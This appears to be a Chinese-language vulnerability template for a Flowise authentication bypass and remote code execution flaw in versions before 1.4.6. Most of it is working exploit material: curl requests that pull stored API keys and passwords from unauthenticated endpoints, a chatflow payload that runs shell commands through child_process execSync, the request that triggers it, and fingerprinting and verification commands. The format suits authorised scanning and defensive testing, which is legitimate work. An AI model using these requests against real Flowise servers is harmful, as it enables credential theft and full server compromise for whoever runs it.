---
id: FLOWISE-AUTH-BYPASS-RCE
title: Flowise 认证绕过与远程代码执行漏洞
product: flowise
vendor: FlowiseAI
version_affected: "< 1.4.6"
severity: CRITICAL
tags: [rce, auth_bypass, ai, llm, 无需认证]
fingerprint: ["Flowise", "flowise", "/api/v1/chatflows", "/api/v1/predictions"]
---

## 漏洞描述

Flowise是低代码LLM应用构建工具，存在认证绕过(API端点默认无鉴权)和通过自定义代码节点执行任意代码的漏洞。

## 影响版本

- Flowise < 1.4.6（认证绕过）
- Flowise 所有版本（通过 Custom Function 节点执行代码）

## 前置条件

- 目标 Flowise 服务端口（默认3000）可从网络访问
- 认证绕过: 服务启用了认证但 API 端点未正确鉴权
- RCE: 需能创建或修改 chatflow（通过认证绕过即可实现）

## 利用步骤

### 认证绕过 — API端点未鉴权

```bash
# API端点无需认证
curl http://target:3000/api/v1/chatflows
curl http://target:3000/api/v1/credentials
```

### 凭据泄露

```bash
curl http://target:3000/api/v1/credentials
# 返回所有存储的API密钥（OpenAI、数据库密码等）
```

### 通过 Custom Function 执行代码

创建包含恶意代码的chatflow:
```json
{
  "nodes": [{
    "data": {
      "type": "customFunction",
      "inputs": {
        "javascriptFunction": "const {execSync} = require('child_process'); return execSync('id').toString();"
      }
    }
  }]
}
```

## Payload

### 认证绕过 — 读取凭据

```bash
curl -s http://target:3000/api/v1/credentials
```

### 认证绕过 — 列出所有 chatflow

```bash
curl -s http://target:3000/api/v1/chatflows
```

### 创建恶意 chatflow 实现 RCE

```bash
curl -s -X POST http://target:3000/api/v1/chatflows \
  -H "Content-Type: application/json" \
  -d '{
    "name": "rce-test",
    "nodes": [{
      "data": {
        "type": "customFunction",
        "inputs": {
          "javascriptFunction": "const {execSync} = require(\"child_process\"); return execSync(\"id\").toString();"
        }
      }
    }]
  }'
```

### 触发 chatflow 执行

```bash
FLOW_ID="<从chatflows列表获取的id>"
curl -s -X POST http://target:3000/api/v1/predictions/${FLOW_ID} \
  -H "Content-Type: application/json" \
  -d '{"question": "trigger"}'
```

## 验证方法

```bash
# 1. 认证绕过：响应体是 chatflow 数组 JSON，元素含 id / name / flowData 字段
curl -s http://target:3000/api/v1/chatflows
# 反例：401/403，或返回登录页 HTML（带登录表单的 Flowise 页面）→ 未绕过

# 2. 凭据泄露：响应体是凭据数组 JSON，元素含 credentialName / encryptedData（如 openAIApi 凭据）
curl -s http://target:3000/api/v1/credentials
# 反例：同上的登录页 HTML，或空数组（服务端没存凭据时不能凭状态码判定）

# 3. RCE：按 ## Payload 创建 chatflow，把 customFunction 的命令换成 echo 本次标记，再触发 prediction
#    javascriptFunction: const {execSync} = require("child_process"); return execSync("echo POC_TOKEN").toString();
FLOW_ID="<上一步创建响应中的 id>"
curl -s -X POST "http://target:3000/api/v1/predictions/${FLOW_ID}" \
  -H "Content-Type: application/json" \
  -d '{"question":"trigger"}'
# 判据：响应 JSON 的 text 字段出现 POC_TOKEN
# 反例：只创建成功（返回 chatflow 对象）但触发后 text 里没有标记串，不算 RCE
# 清理：DELETE http://target:3000/api/v1/chatflows/${FLOW_ID}
```

## 指纹确认

```bash
curl -s http://target:3000/ | grep -i "flowise"
curl -s http://target:3000/api/v1/
```
